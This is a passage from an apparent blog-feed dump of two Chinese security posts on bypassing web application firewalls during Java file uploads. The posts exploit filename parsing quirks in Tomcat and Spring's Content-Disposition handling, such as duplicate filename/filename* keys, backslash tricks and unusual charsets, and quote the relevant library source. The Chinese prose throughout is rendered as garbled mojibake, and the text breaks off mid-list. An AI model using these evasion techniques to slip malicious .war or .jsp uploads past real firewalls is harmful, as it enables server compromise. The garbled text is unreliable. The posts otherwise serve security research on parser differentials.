æµé‡å±‚é¢wafç»•è¿‡å§¿åŠ¿ç³»åˆ—äºŒ/","link":"","permalink":"https://y4tacker.github.io/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/","excerpt":"","text":"æ¢å¯»Javaæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢wafç»•è¿‡å§¿åŠ¿ç³»åˆ—äºŒå†™åœ¨å‰é¢è¿™ç¯‡å’Œä¸Šç¯‡ä¸åŒçš„æ˜¯ä¸Šç¯‡æ›´å¤šå…³æ³¨äºRFCæ–‡æ¡£è§„èŒƒçš„éƒ¨åˆ†ï¼Œè€Œè¿™ç¯‡æ›´å…³æ³¨äºå¦‚ä½•ä»ä»£ç å±‚é¢ä¸Šçš„åˆ©ç”¨æ¥ç»•è¿‡ï¼Œå…·ä½“å†…å®¹è¯·æ¥ç€å¾€ä¸‹çœ‹ æ­£æ–‡tomcatçµæ´»çš„parseQuotedTokenç»§ç»­çœ‹çœ‹è¿™ä¸ªè§£ævalueçš„å‡½æ•°ï¼Œå®ƒæœ‰ä¸¤ä¸ªç»ˆæ­¢æ¡ä»¶ï¼Œä¸€ä¸ªæ˜¯èµ°åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œå¦ä¸€ä¸ªæ˜¯é‡åˆ°; å¦‚æœæˆ‘ä»¬èƒ½çµæ´»æ§åˆ¶ç»ˆæ­¢æ¡ä»¶ï¼Œé‚£ä¹ˆwafå¼•æ“åœ¨æ­¤åŸºç¡€ä¸Šè¿˜èƒ½ä¸èƒ½ç»§ç»­å‡†ç¡®è¯†åˆ«å‘¢ï¼Ÿ 123456789101112131415161718192021private String parseQuotedToken(final char[] terminators) &#123; char ch; i1 = pos; i2 = pos; boolean quoted = false; boolean charEscaped = false; while (hasChar()) &#123; ch = chars[pos]; if (!quoted &amp;&amp; isOneOf(ch, terminators)) &#123; break; &#125; if (!charEscaped &amp;&amp; ch == &#x27;&quot;&#x27;) &#123; quoted = !quoted; &#125; charEscaped = (!charEscaped &amp;&amp; ch == &#x27;\\\\&#x27;); i2++; pos++; &#125; return getToken(true);&#125; å¦‚æœä½ ç†è§£äº†ä¸Šé¢çš„ä»£ç ä½ å°±èƒ½æ„é€ å‡ºä¸‹é¢çš„ä¾‹å­ åŒæ—¶æˆ‘ä»¬çŸ¥é“jspå¦‚æœå¸¦&quot;ç¬¦å·ä¹Ÿæ˜¯å¯ä»¥è®¿é—®åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜å¯ä»¥æ„é€ å‡ºè¿™æ ·çš„ä¾‹å­ è¿˜èƒ½æ›´å¤æ‚ç‚¹ä¹ˆï¼Œå½“ç„¶å¯ä»¥çš„ç»“åˆè¿™é‡Œçš„\\ï¼Œä»¥åŠä¸Šç¯‡æ–‡ç« å½“ä¸­æåˆ°çš„org.apache.tomcat.util.http.parser.HttpParser#unquoteä¸­å¯¹å‡ºç°\\åå‚æ•°çš„è½¬åŒ–æ“ä½œï¼Œè¿™æ—¶å€™å¦‚æœwafæ£€æµ‹å¼•æ“å½“ä¸­æ˜¯ä»¥æœ€è¿‘&quot;&quot;ä½œä¸ºä¸€å¯¹é—­åˆçš„åŒ¹é…ï¼Œé‚£ä¹ˆwafæ£€æµ‹å¼•æ“å¯èƒ½ä¼šè®¤ä¸ºè¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶åæ˜¯y4tacker.txt\\,ä»è€Œæ”¾è¡Œ å˜å½¢ä¹‹åŒå†™filename*ä¸filenameè¿™ä¸ªåœºæ™¯ç›¸å¯¹ç®€å• é¦–å…ˆtomcatçš„org.apache.catalina.core.ApplicationPart#getSubmittedFileNameçš„åœºæ™¯ä¸‹ï¼Œæ–‡ä»¶ä¸Šä¼ è§£æheaderçš„è¿‡ç¨‹å½“ä¸­ï¼Œå­˜åœ¨whileå¾ªç¯ä¼šä¸æ–­å¾€åè¯»å–ï¼Œæœ€ç»ˆä¼šå°†key/valueä»¥Haspmapçš„å½¢å¼ä¿å­˜ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å†™å¤šä¸ªé‚£ä¹ˆå°±ä¼šå¯¹å…¶è¦†ç›–ï¼Œåœ¨è¿™ä¸ªåœºæ™¯ä¸‹ç»•è¿‡wafå¼•æ“æ²¡æœ‰è®¾è®¡å®Œå–„åœ¨åŒæ—¶å‡ºç°ä¸¤ä¸ªfilenameçš„æ—¶å€™åˆ°åº•å–ç¬¬ä¸€ä¸ªè¿˜æ˜¯ç¬¬äºŒä¸ªè¿˜æ˜¯éƒ½å¤„ç†ï¼Œè¿™äº›å·®å¼‚æ€§ä¹Ÿå¯èƒ½å¯¼è‡´å‡ºç°ä¸€äº›æ–°çš„åœºæ™¯ åŒæ—¶è¿™é‡Œä¸‹é¢ä¸€æ–¹é¢ä¼šåˆ é™¤æœ€åä¸€ä¸ª* å¦ä¸€æ–¹é¢å¦‚æœlowerCaseNamesä¸ºtrueï¼Œé‚£ä¹ˆå‚æ•°åè¿˜ä¼šè½¬ä¸ºå°å†™ï¼Œæ°å¥½è¿™é‡Œç¡®å®è®¾ç½®äº†è¿™ä¸€ç‚¹ å› æ­¤ç»¼åˆèµ·æ¥å¯ä»¥å†™å‡ºè¿™æ ·çš„payloadï¼Œå½“ç„¶ç»“åˆä¸Šç¯‡è¿˜å¯ä»¥å˜å¾—æ›´å¤šå˜è¿™é‡Œä¸å†è®¨è®º å˜å½¢ä¹‹ç¼–ç è¯¯ç”¨å‡è®¾è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼ŒwafåŒæ—¶æ”¯æŒå¤šä¸ªè¯­è¨€ï¼Œä¹Ÿå‡çº§åˆ°äº†æ–°ç‰ˆæœ¬ä¼šè§£æfilename*ï¼Œå‡è®¾goå½“ä¸­æœ‰ä¸ªç¼–ç å«y4ï¼Œè€Œjavaå½“ä¸­æ²¡æœ‰ï¼Œwafä¸ºäº†æ•ˆç‡å°†ä¸¤ä¸ªæ··åˆå¤„ç†ï¼Œè¿™æ ·ä¼šå¯¼è‡´ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ å¦‚æœæ²¡æœ‰,è¿™é‡ŒæŠ¥é”™åä¼šä¿æŒåŸæ¥çš„å€¼ï¼Œå› æ­¤æˆ‘è®¤ä¸ºè¿™ä¹Ÿå¯ä»¥ä½œä¸ºä¸€ç§ç»•è¿‡æ€è·¯ï¼Ÿ 123456try &#123; paramValue = RFC2231Utility.hasEncodedValue(paramName) ? RFC2231Utility.decodeText(paramValue) : MimeUtility.decodeText(paramValue);&#125; catch (final UnsupportedEncodingException e) &#123; // let&#x27;s keep the original value in this case&#125; Spring4è¿™é‡Œæˆ‘ç”¨äº†springboot1.5.20RELEASE+springframework4.3.23ï¼Œè¿™é‡Œä¸å»ç ”ç©¶å°ç‰ˆæœ¬é—´æ˜¯å¦æœ‰å·®å¼‚åªçœ‹çœ‹å¤§ç‰ˆæœ¬äº† çŒœçŒœæˆ‘åœ¨ç¬¬å‡ å±‚è¯´ä¸ªå‰æè¿™é‡Œåªé’ˆå¯¹å•æ–‡ä»¶ä¸Šä¼ çš„æƒ…å†µï¼Œè™½ç„¶è¿™é‡Œçš„ä»£ç é€»è¾‘ä¸€çœ¼çœ‹å‡ºä¸èƒ½æœ‰ä¸Šé¢é‚£ç§å­˜åœ¨åŒå†™çš„é—®é¢˜ï¼Œä½†æ˜¯è¿™é‡Œåˆæœ‰ä¸ªæ›´æœ‰è¶£çš„ç°è±¡ æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªextractFilenameå‡½æ•°é‡Œé¢åˆ°åº•æœ‰å•¥éªšæ“ä½œå§ï¼Œè¿™é‡Œé å‡½æ•°indexOfå»å®šä½key(filename=/filename*=)å†åšæˆªå–æ“ä½œ 1234567891011121314151617181920212223242526private String extractFilename(String contentDisposition, String key) &#123; if (contentDisposition == null) &#123; return null; &#125; else &#123; int startIndex = contentDisposition.indexOf(key); if (startIndex == -1) &#123; return null; &#125; else &#123; String filename = contentDisposition.substring(startIndex + key.length()); int endIndex; if (filename.startsWith(&quot;\\&quot;&quot;)) &#123; endIndex = filename.indexOf(&quot;\\&quot;&quot;, 1); if (endIndex != -1) &#123; return filename.substring(1, endIndex); &#125; &#125; else &#123; endIndex = filename.indexOf(&quot;;&quot;); if (endIndex != -1) &#123; return filename.substring(0, endIndex); &#125; &#125; return filename; &#125; &#125;&#125; è¿™æ—¶å€™ä½ çš„ååº”åº”è¯¥ä¼šå’Œæˆ‘ä¸€æ ·ï¼Œå¥—ä¸­å¥—ä¹‹wafä½ çŒœçŒœæˆ‘æ˜¯è° å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸è¦åŒå¼•å·ï¼Œè®©wafå“­å»å§ Spring5åŒæ ·æ˜¯springboot2.6.4+springframework5.3ï¼Œè¿™é‡Œä¸å»ç ”ç©¶å°ç‰ˆæœ¬é—´æ˜¯å¦æœ‰å·®å¼‚åªçœ‹çœ‹å¤§ç‰ˆæœ¬äº† â€œåŒå†™â€ç»•è¿‡æ¥çœ‹çœ‹æ ¸å¿ƒéƒ¨åˆ† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public static ContentDisposition parse(String contentDisposition) &#123; List&lt;String&gt; parts = tokenize(contentDisposition); String type = (String)parts.get(0); String name = null; String filename = null; Charset charset = null; Long size = null; ZonedDateTime creationDate = null; ZonedDateTime modificationDate = null; ZonedDateTime readDate = null; for(int i = 1; i &lt; parts.size(); ++i) &#123; String part = (String)parts.get(i); int eqIndex = part.indexOf(61); if (eqIndex == -1) &#123; throw new IllegalArgumentException(&quot;Invalid content disposition format&quot;); &#125; String attribute = part.substring(0, eqIndex); String value = part.startsWith(&quot;\\&quot;&quot;, eqIndex + 1) &amp;&amp; part.endsWith(&quot;\\&quot;&quot;) ? part.substring(eqIndex + 2, part.length() - 1) : part.substring(eqIndex + 1); if (attribute.equals(&quot;name&quot;)) &#123; name = value; &#125; else if (!attribute.equals(&quot;filename*&quot;)) &#123; //é™åˆ¶äº†å¦‚æœä¸ºnullæ‰èƒ½èµ‹å€¼ if (attribute.equals(&quot;filename&quot;) &amp;&amp; filename == null) &#123; if (value.startsWith(&quot;=?&quot;)) &#123; Matcher matcher = BASE64_ENCODED_PATTERN.matcher(value); if (matcher.find()) &#123; String match1 = matcher.group(1); String match2 = matcher.group(2); filename = new String(Base64.getDecoder().decode(match2), Charset.forName(match1)); &#125; else &#123; filename = value; &#125; &#125; else &#123; filename = value; &#125; &#125; else if (attribute.equals(&quot;size&quot;)) &#123; size = Long.parseLong(value); &#125; else if (attribute.equals(&quot;creation-date&quot;)) &#123; try &#123; creationDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME); &#125; catch (DateTimeParseException var20) &#123; &#125; &#125; else if (attribute.equals(&quot;modification-date&quot;)) &#123; try &#123; modificationDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME); &#125; catch (DateTimeParseException var19) &#123; &#125; &#125; else if (attribute.equals(&quot;read-date&quot;)) &#123; try &#123; readDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME); &#125; catch (DateTimeParseException var18) &#123; &#125; &#125; &#125; else &#123; int idx1 = value.indexOf(39); int idx2 = value.indexOf(39, idx1 + 1); if (idx1 != -1 &amp;&amp; idx2 != -1) &#123; charset = Charset.forName(value.substring(0, idx1).trim()); Assert.isTrue(StandardCharsets.UTF_8.equals(charset) || StandardCharsets.ISO_8859_1.equals(charset), &quot;Charset should be UTF-8 or ISO-8859-1&quot;); filename = decodeFilename(value.substring(idx2 + 1), charset); &#125; else &#123; filename = decodeFilename(value, StandardCharsets.US_ASCII); &#125; &#125; &#125; return new ContentDisposition(type, name, filename, charset, size, creationDate, modificationDate, readDate);&#125; spring5å½“ä¸­åˆå’Œspring4é€»è¾‘æœ‰åŒºåˆ«ï¼Œå¯¼è‡´æˆ‘ä»¬åˆå¯ä»¥â€åŒå†™â€ç»•è¿‡(è‡³äºä¸ºä»€ä¹ˆæˆ‘è¦æ‰“å¼•å·å¯ä»¥çœ‹çœ‹æˆ‘ä»£ç ä¸­çš„æ³¨é‡Š)ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬å…ˆä¼ filename=xxxå†ä¼ filename*=xxxï¼Œç”±äºæ²¡æœ‰å‰é¢æåˆ°çš„filename == nullçš„åˆ¤æ–­ï¼Œé€ æˆå¯ä»¥è¦†ç›–filenameçš„å€¼ åŒæ ·æˆ‘ä»¬å…¨ç”¨filename*ä¹Ÿå¯ä»¥å®ç°åŒå†™ç»•è¿‡ï¼Œå’Œä¸Šé¢ä¸€ä¸ªé“ç† ä½†ç”±äºè¿™é‡Œindexofçš„æ¡ä»¶å˜æˆäº†â€=â€å·ï¼Œè€Œä¸åƒspring4é‚£æ ·çš„filename=/filename=*ï¼Œæ¯•ç«Ÿindexofé»˜è®¤å–ç¬¬ä¸€ä¸ªï¼Œé€ æˆä¸èƒ½åƒspring4é‚£æ ·åšåµŒå¥—æ“ä½œ","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"æ¢å¯»Tomcatæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢ç»•wafæ–°å§¿åŠ¿","slug":"year/2022/6/æ¢å¯»Tomcatæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢ç»•wafæ–°å§¿åŠ¿","date":"2022-06-19T05:50:24.000Z","updated":"2024-08-04T09:01:49.648Z","comments":true,"path":"2022/06/19/year/2022/6/æ¢å¯»Tomcatæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢ç»•wafæ–°å§¿åŠ¿/","link":"","permalink":"https://y4tacker.github.io/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"æ¢å¯»Tomcatæ–‡ä»¶ä¸Šä¼ æµé‡å±‚é¢ç»•wafæ–°å§¿åŠ¿å†™åœ¨å‰é¢â€‹ æ— æ„ä¸­çœ‹åˆ°ch1ngå¸ˆå‚…çš„æ–‡ç« è§‰å¾—å¾ˆæœ‰è¶£ï¼Œä¸å¾—ä¸æ„Ÿå¹å¸ˆå‚…å¤ªå‰å®³äº†ï¼Œä½†æˆ‘ä¸€çœ‹é‚£é•¿ç¯‡çš„å‡½æ•°æ€»è§‰å¾—ä¼šæœ‰æ›´éªšçš„ä¸œè¥¿ï¼Œæ‰€å¹¸è¿˜çœŸçš„æœ‰ï¼Œå€Ÿæ­¤æœºä¼šå°±å‘å‡ºæ¥ä¸€æ¢ç©¶ç«Ÿï¼ŒåŒæ—¶ä¹Ÿä¸å¾—ä¸æ„Ÿæ…¨ä¸‹RFCæ–‡æ¡£çš„å¦™å¤„ï¼Œå½“ç„¶æœ¬æ–‡é’ˆå¯¹çš„æŠ€æœ¯ä¹Ÿä»…ä»…åªæ˜¯åœ¨æµé‡å±‚é¢ä¸Šwafçš„ç»•è¿‡ Preå¾ˆç¥å¥‡å¯¹å§ï¼Œå½“ç„¶è¿™ä¸æ˜¯ç»ˆç‚¹,æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥ä¸€æ¢ç©¶ç«Ÿ å‰ç½®è¿™é‡Œç®€å•è¯´ä¸€ä¸‹å¸ˆå‚…çš„æ€è·¯ éƒ¨ç½²ä¸å¤„ç†ä¸Šä¼ warçš„servletæ˜¯org.apache.catalina.manager.HTMLManagerServlet åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶æœ€ç»ˆä¼šé€šè¿‡å¤„ç†org.apache.catalina.manager.HTMLManagerServlet#upload è°ƒç”¨çš„æ˜¯å…¶å­ç±»å®ç°ç±»org.apache.catalina.core.ApplicationPart#getSubmittedFileName è¿™é‡Œè·å–filenameçš„æ—¶å€™çš„å¤„ç†å¾ˆæœ‰è¶£ çœ‹åˆ°è¿™æ®µæ³¨é‡Šï¼Œå‘ç°åœ¨RFC 6266æ–‡æ¡£å½“ä¸­ä¹Ÿæå‡ºè¿™ç‚¹ 1Avoid including the &quot;\\&quot; character in the quoted-string form of the filename parameter, as escaping is not implemented by some user agents, and &quot;\\&quot; can be considered an illegal path character. é‚£ä¹ˆæˆ‘ä»¬çš„tomcatæ˜¯å¦‚ä½•å¤„ç†çš„å˜ï¼Ÿè¿™é‡Œå®ƒé€šè¿‡å‡½æ•°HttpParser.unquoteå»è¿›è¡Œå¤„ç† 1234567891011121314151617181920212223242526272829public static String unquote(String input) &#123; if (input == null || input.length() &lt; 2) &#123; return input; &#125; int start; int end; // Skip surrounding quotes if there are any if (input.charAt(0) == &#x27;&quot;&#x27;) &#123; start = 1; end = input.length() - 1; &#125; else &#123; start = 0; end = input.length(); &#125; StringBuilder result = new StringBuilder(); for (int i = start ; i &lt; end; i++) &#123; char c = input.charAt(i); if (input.charAt(i) == &#x27;\\\\&#x27;) &#123; i++; result.append(input.charAt(i)); &#125; else &#123; result.append(c); &#125; &#125; return result.toString(); &#125; ç®€å•åšä¸ªæ€»ç»“å¦‚æœé¦–ä½æ˜¯&quot;(å‰ææ¡ä»¶æ˜¯é‡Œé¢æœ‰\\å­—ç¬¦)ï¼Œé‚£ä¹ˆå°±ä¼šå»æ‰è·³è¿‡ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹ï¼Œå¹¶ä¸”æœ«å°¾ä¹Ÿä¼šå¾€å‰ç§»åŠ¨ä¸€ä½ï¼ŒåŒæ—¶ä¼šå¿½ç•¥å­—ç¬¦\\ï¼Œå¸ˆå‚…åªæåˆ°äº†ç±»ä¼¼test.\\warè¿™æ ·çš„ä¾‹å­ ä½†å…¶å®æ ¹æ®è¿™ä¸ªæˆ‘ä»¬è¿˜å¯ä»¥è¿›ä¸€æ­¥æ„é€ ä¸€äº›çœ‹ç€æ¯”è¾ƒæ¶å¿ƒçš„æ¯”å¦‚filename=&quot;&quot;y\\4.\\w\\arK&quot; æ·±å…¥è¿˜æ˜¯åœ¨org.apache.catalina.core.ApplicationPart#getSubmittedFileNameå½“ä¸­ï¼Œä¸€çœ‹åˆ°è¿™ä¸ªå°†å­—ç¬¦ä¸²è½¬æ¢æˆmapçš„æ“ä½œæ€»è§‰å¾—é‡Œé¢ä¼šæœ‰æ›´éªšçš„ä¸œè¥¿(è¿™é‡Œå…ˆæ˜¯è§£æä¼ å…¥çš„å‚æ•°å†è·å–ï¼Œå¦‚æœè§£æè¿‡ç¨‹æœ‰åˆ©ç”¨ç‚¹é‚£ä¹ˆä¹Ÿä¼šå½±å“åˆ°åé¢å‚æ•°è·å–)ï¼Œä¸æ‰¯è¿œç»§ç»­å›åˆ°æ­£é¢˜ é¦–å…ˆå®ƒä¼šè·å–headerå‚æ•°Content-Dispositionå½“ä¸­çš„å€¼ï¼Œå¦‚æœä»¥form-dataæˆ–è€…attachmentå¼€å¤´å°±ä¼šè¿›è¡Œæˆ‘ä»¬çš„è§£ææ“ä½œï¼Œè·Ÿè¿›å»ä¸€çœ‹æœä¸å…¶ç„¶ï¼Œçœ‹åˆ°RFC2231Utilityç¬é—´ä¸å›°äº† åé¢è¿™ä¸€å¨å°±ä¸å¿…å¤šè¯´äº†ï¼Œç›¸ä¿¡å¤§å®¶å·²ç»å¾ˆç†Ÿæ‚‰å•¦æ”¯æŒQPç¼–ç ï¼Œå¿˜äº†çš„å¯ä»¥è€ƒå¤çœ‹çœ‹æˆ‘ä¹‹å‰å†™çš„æ–‡ç« Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶)ï¼Œè¿™é‡Œå°±ä¸å†é‡å¤è¿™ä¸ªå•¦ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹ä¸‰å…ƒè¿ç®—ç¬¦å‰é¢çš„è¿™æ®µ æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªhasEncodedValueåˆ¤æ–­æ ‡å‡†æ˜¯ä»€ä¹ˆï¼Œå­—ç¬¦ä¸²æœ«å°¾æ˜¯å¦å¸¦* 123456public static boolean hasEncodedValue(final String paramName) &#123; if (paramName != null) &#123; return paramName.lastIndexOf(&#x27;*&#x27;) == (paramName.length() - 1); &#125; return false;&#125; åœ¨çœ‹è§£å¯†å‡½æ•°ä¹‹å‰æˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹RFC 2231æ–‡æ¡£å½“ä¸­å¯¹æ­¤çš„æè¿°ï¼Œè‹±æ–‡å€’æ˜¯å¾ˆç®€å•ä¸æ‡‚çš„å¯ä»¥åœ¨çº¿ç¿»ä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸è´´ä¸­æ–‡äº† 1234Asterisks (&quot;*&quot;) are reused to provide the indicator that language and character set information is present and encoding is being used. A single quote (&quot;&#x27;&quot;) is used to delimit the character set and language information at the beginning of the parameter value. Percent signs (&quot;%&quot;) are used as the encoding flag, which agrees with RFC 2047.Specifically, an asterisk at the end of a parameter name acts as an indicator that character set and language information may appear at the beginning of the parameter value. A single quote is used to separate the character set, language, and actual value information in the parameter value string, and an percent sign is used to flag octets encoded in hexadecimal. For example:Content-Type: application/x-stuff; title*=us-ascii&#x27;en-us&#x27;This%20is%20%2A%2A%2Afun%2A%2A%2A æ¥ä¸‹æ¥å›åˆ°æ­£é¢˜ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹çœ‹è¿™ä¸ªè§£ç åšäº†äº›ä»€ä¹ˆ 123456789101112131415public static String decodeText(final String encodedText) throws UnsupportedEncodingException &#123; final int langDelimitStart = encodedText.indexOf(&#x27;\\&#x27;&#x27;); if (langDelimitStart == -1) &#123; // missing charset return encodedText; &#125; final String mimeCharset = encodedText.substring(0, langDelimitStart); final int langDelimitEnd = encodedText.indexOf(&#x27;\\&#x27;&#x27;, langDelimitStart + 1); if (langDelimitEnd == -1) &#123; // missing language return encodedText; &#125; final byte[] bytes = fromHex(encodedText.substring(langDelimitEnd + 1)); return new String(bytes, getJavaCharset(mimeCharset));&#125; ç»“åˆæ³¨é‡Šå¯ä»¥çœ‹åˆ°æ ‡å‡†æ ¼å¼@param encodedText - Text to be decoded has a format of &#123;@code &lt;charset&gt;&#39;&lt;language&gt;&#39;&lt;encoded_value&gt;&#125;,åˆ†åˆ«æ˜¯ç¼–ç ï¼Œè¯­è¨€å’Œå¾…è§£ç çš„å­—ç¬¦ä¸²ï¼ŒåŒæ—¶è¿™é‡Œè¿˜é€‚é…äº†å¯¹urlç¼–ç çš„è§£ç ï¼Œä¹Ÿå°±æ˜¯fromHexå‡½æ•°,å…·ä½“ä»£ç å¦‚ä¸‹ï¼Œå…¶å®å°±æ˜¯urlè§£ç  123456789101112131415161718private static byte[] fromHex(final String text) &#123; final int shift = 4; final ByteArrayOutputStream out = new ByteArrayOutputStream(text.length()); for (int i = 0; i &lt; text.length();) &#123; final char c = text.charAt(i++); if (c == &#x27;%&#x27;) &#123; if (i &gt; text.length() - 2) &#123; break; // unterminated sequence &#125; final byte b1 = HEX_DECODE[text.charAt(i++) &amp; MASK]; final byte b2 = HEX_DECODE[text.charAt(i++) &amp; MASK]; out.write((b1 &lt;&lt; shift) | b2); &#125; else &#123; out.write((byte) c); &#125; &#125; return out.toByteArray();&#125; å› æ­¤æˆ‘ä»¬å°†å€¼å½“ä¸­å€¼å¾—æ³¨æ„çš„ç‚¹æ¢³ç†ä¸€ä¸‹ æ”¯æŒç¼–ç çš„è§£ç  å€¼å½“ä¸­å¯ä»¥è¿›è¡Œurlç¼–ç  @code&lt;charset&gt;&#39;&lt;language&gt;&#39;&lt;encoded_value&gt; ä¸­é—´è¿™ä½languageå¯ä»¥éšä¾¿å†™ï¼Œä»£ç é‡Œæ²¡æœ‰ç”¨åˆ°è¿™ä¸ªçš„å¤„ç† æ—¢ç„¶å¦‚æ­¤é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå°±å¯ä»¥æ’å‡ºæ‰utf-8ï¼Œæ¯•ç«Ÿè¿™ä¸ªè§£ç åå°±ç›´æ¥æ˜¯æ˜æ–‡ï¼Œä»Javaæ ‡å‡†åº“å½“ä¸­çš„charsets.jarå¯ä»¥çœ‹å‡ºï¼Œæ”¯æŒçš„ç¼–ç æœ‰å¾ˆå¤š åŒæ—¶é€šè¿‡ç®€å•çš„ä»£ç ä¹Ÿå¯ä»¥è¾“å‡º 123456789101112Locale locale = Locale.getDefault();Map&lt;String, Charset&gt; maps = Charset.availableCharsets();StringBuilder sb = new StringBuilder();sb.append(&quot;&#123;&quot;);for (Map.Entry&lt;String, Charset&gt; entry : maps.entrySet()) &#123; String key = entry.getKey(); Charset value = entry.getValue(); sb.append(&quot;\\&quot;&quot; + key + &quot;\\&quot;,&quot;);&#125;sb.deleteCharAt(sb.length() - 1);sb.append(&quot;&#125;&quot;);System.out.println(sb.toString()); è¿è¡Œè¾“å‡º 12//res&#123;&quot;Big5&quot;,&quot;Big5-HKSCS&quot;,&quot;CESU-8&quot;,&quot;EUC-JP&quot;,&quot;EUC-KR&quot;,&quot;GB18030&quot;,&quot;GB2312&quot;,&quot;GBK&quot;,&quot;IBM-Thai&quot;,&quot;IBM00858&quot;,&quot;IBM01140&quot;,&quot;IBM01141&quot;,&quot;IBM01142&quot;,&quot;IBM01143&quot;,&quot;IBM01144&quot;,&quot;IBM01145&quot;,&quot;IBM01146&quot;,&quot;IBM01147&quot;,&quot;IBM01148&quot;,&quot;IBM01149&quot;,&quot;IBM037&quot;,&quot;IBM1026&quot;,&quot;IBM1047&quot;,&quot;IBM273&quot;,&quot;IBM277&quot;,&quot;IBM278&quot;,&quot;IBM280&quot;,&quot;IBM284&quot;,&quot;IBM285&quot;,&quot;IBM290&quot;,&quot;IBM297&quot;,&quot;IBM420&quot;,&quot;IBM424&quot;,&quot;IBM437&quot;,&quot;IBM500&quot;,&quot;IBM775&quot;,&quot;IBM850&quot;,&quot;IBM852&quot;,&quot;IBM855&quot;,&quot;IBM857&quot;,&quot;IBM860&quot;,&quot;IBM861&quot;,&quot;IBM862&quot;,&quot;IBM863&quot;,&quot;IBM864&quot;,&quot;IBM865&quot;,&quot;IBM866&quot;,&quot;IBM868&quot;,&quot;IBM869&quot;,&quot;IBM870&quot;,&quot;IBM871&quot;,&quot;IBM918&quot;,&quot;ISO-2022-CN&quot;,&quot;ISO-2022-JP&quot;,&quot;ISO-2022-JP-2&quot;,&quot;ISO-2022-KR&quot;,&quot;ISO-8859-1&quot;,&quot;ISO-8859-13&quot;,&quot;ISO-8859-15&quot;,&quot;ISO-8859-2&quot;,&quot;ISO-8859-3&quot;,&quot;ISO-8859-4&quot;,&quot;ISO-8859-5&quot;,&quot;ISO-8859-6&quot;,&quot;ISO-8859-7&quot;,&quot;ISO-8859-8&quot;,&quot;ISO-8859-9&quot;,&quot;JIS_X0201&quot;,&quot;JIS_X0212-1990&quot;,&quot;KOI8-R&quot;,&quot;KOI8-U&quot;,&quot;Shift_JIS&quot;,&quot;TIS-620&quot;,&quot;US-ASCII&quot;,&quot;UTF-16&quot;,&quot;UTF-16BE&quot;,&quot;UTF-16LE&quot;,&quot;UTF-32&quot;,&quot;UTF-32BE&quot;,&quot;UTF-32LE&quot;,&quot;UTF-8&quot;,&quot;windows-1250&quot;,&quot;windows-1251&quot;,&quot;windows-1252&quot;,&quot;windows-1253&quot;,&quot;windows-1254&quot;,&quot;windows-1255&quot;,&quot;windows-1256&quot;,&quot;windows-1257&quot;,&quot;windows-1258&quot;,&quot;windows-31j&quot;,&quot;x-Big5-HKSCS-2001&quot;,&quot;x-Big5-Solaris&quot;,&quot;x-COMPOUND_TEXT&quot;,&quot;x-euc-jp-linux&quot;,&quot;x-EUC-TW&quot;,&quot;x-eucJP-Open&quot;,&quot;x-IBM1006&quot;,&quot;x-IBM1025&quot;,&quot;x-IBM1046&quot;,&quot;x-IBM1097&quot;,&quot;x-IBM1098&quot;,&quot;x-IBM1112&quot;,&quot;x-IBM1122&quot;,&quot;x-IBM1123&quot;,&quot;x-IBM1124&quot;,&quot;x-IBM1166&quot;,&quot;x-IBM1364&quot;,&quot;x-IBM1381&quot;,&quot;x-IBM1383&quot;,&quot;x-IBM300&quot;,&quot;x-IBM33722&quot;,&quot;x-IBM737&quot;,&quot;x-IBM833&quot;,&quot;x-IBM834&quot;,&quot;x-IBM856&quot;,&quot;x-IBM874&quot;,&quot;x-IBM875&quot;,&quot;x-IBM921&quot;,&quot;x-IBM922&quot;,&quot;x-IBM930&quot;,&quot;x-IBM933&quot;,&quot;x-IBM935&quot;,&quot;x-IBM937&quot;,&quot;x-IBM939&quot;,&quot;x-IBM942&quot;,&quot;x-IBM942C&quot;,&quot;x-IBM943&quot;,&quot;x-IBM943C&quot;,&quot;x-IBM948&quot;,&quot;x-IBM949&quot;,&quot;x-IBM949C&quot;,&quot;x-IBM950&quot;,&quot;x-IBM964&quot;,&quot;x-IBM970&quot;,&quot;x-ISCII91&quot;,&quot;x-ISO-2022-CN-CNS&quot;,&quot;x